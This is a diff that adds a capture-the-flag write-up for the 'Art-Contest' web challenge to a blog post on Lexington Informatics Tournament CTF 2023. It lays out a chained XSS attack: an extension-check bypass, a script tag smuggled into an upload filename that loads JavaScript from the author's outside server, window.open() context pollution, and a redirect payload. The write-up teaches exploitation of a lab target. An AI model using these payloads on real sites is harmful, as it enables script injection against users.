@@ -1,3 +1,4 @@
+
 ---
 layout: post
 title: Lexington Informatics Tournament CTF 2023
@@ -542,3 +543,79 @@ while True:
 ```
 Thankfully the flag wasn't too long: `LITCTF{c4refu1_fr}`
 
+## Art-Contest
+This challenge had a lot of steps and in the end was only solved by 7 teams.
+
+### The Goal
+When doing web challenges, I'll usually work backwards by first figuring out where the flag is stored and then seeing what functionality can be used to reach that target. In this case, if the `/judge` endpoint is called with a valid ID and the bot subsequently opens the status page for the ID and it contains "winner!!" in its text, it will replace the content of the status file with the flag. We can then visit the status page and retrieve the flag. It seems as though we will need to confuse the judge bot into thinking our page contains the aforementioned text.
+
+### XSS via file upload bypass
+It is possible to upload any file which has either an extension of "txt" or no extension at all. To check the extension, the following code is used:
+`ext = os.path.splitext(abs_path)[1]`
+This is not a secure means of validating a file extension and we can get XSS by uploading a file with a name such as `...html` to the `/upload` endpoint.
+We tried a number of directory traversal tricks here but didn't find anything of use aside from the XSS.
+This XSS is useful because the judge bot will visit this file before checking the page status. We can use this to manipulate the bot so that its next request to check the status will contain `winner!!`. But how?
+### Polluting context.pages
+We can see the following code defines `status_page`:
+`status_page = context.pages[1]`
+In order to get the flag, we must see `winner!!` in the `status_page.content()` method call. We noticed that using the previous XSS to call `window.open()` does just that. It will add an additional page to the `context.pages` list and it happens to be located at `context.pages[1]`in the list!
+A little known fact is that you can actually modify the content of a `window.open()` using code such as:
+```js
+var my = window.open('/x' + e, '_blank' ,"height=600, width=600");
+
+my.onload = function () {
+ my.document.body.innerHTML = "winner!!";
+};
+```
+
+This would be pass the check for content containing `winner!!` but we must also allow for the `status_page.url ==  "http://localhost:5000/status/" + id` check.
+Herein lies a small issue; we don't know the value for the `id` variable!
+This isn't actually such a big problem, we can just upload a separate file and save its ID. Then we have a valid ID to reference. I decided to host this on my server and use a `fetch()` to pull its value so I could easily change the ID if I needed:
+
+```js
+fetch("http://ireland.re/callback").then(r => {console.log(r.text().then(e => {
+
+var my = window.open('http://127.0.0.1:5000/status/' + e, '_blank' ,"height=600, width=600");
+
+my.onload = function () {
+ my.document.body.innerHTML = "winner!!";
+};
+```
+But we encounter another problem here. You can only edit the content of a window if it's within the same origin in which the javascript is executing. Our payload is running on the `file://` URI, which does not have authority over a `localhost` page.
+
+### XSS via filename
+Then I noticed that there is actually a second XSS, in the filename of the upload. We can pass the above script in here (where it will be able to modify the `window.open`).
+
+But it won't ever visit this page, right?
+
+Yes, it won't. But we can now just redirect from the `file://` page to this.
+
+### Final Approach
+
+We upload a file with the name `<script src='http://ireland.re/js'></script>` which has the following contents:
+```js
+fetch("http://ireland.re/callback").then(r => {console.log(r.text().then(e => {
+
+var my = window.open('http://127.0.0.1:5000/status/' + e, '_blank' ,"height=600, width=600");
+
+my.onload = function () {
+ my.document.body.innerHTML = "winner!!";
+};
+```
+We save the ID of the uploaded file.
+
+Then, we upload a file with the following contents:
+
+We first upload a file names `...html` with the following contents:
+```html
+<script>
+window.location.href = "http://127.0.0.1:5000/status/<id>";
+</script>
+```
+We can substitute the ID in above, for `<id>` and it will redirect to the page containing our payload.
+We will need to first submit the original file for judging, so its status page is populated with our XSS payload. Then, we can submit the previously uploaded file for judging.
+It will visit our `file://` XSS which will redirect it to our status page containing another XSS, use `window.open()` to pollute the page context and modify it to contain `winner!!` with the correct origin. Then, we simply visit the status page to retrieve the flag!
+
+### Credits
+Thanks to all members of Ireland Without the RE who helped with this. It was a fun challenge!
+-m0z
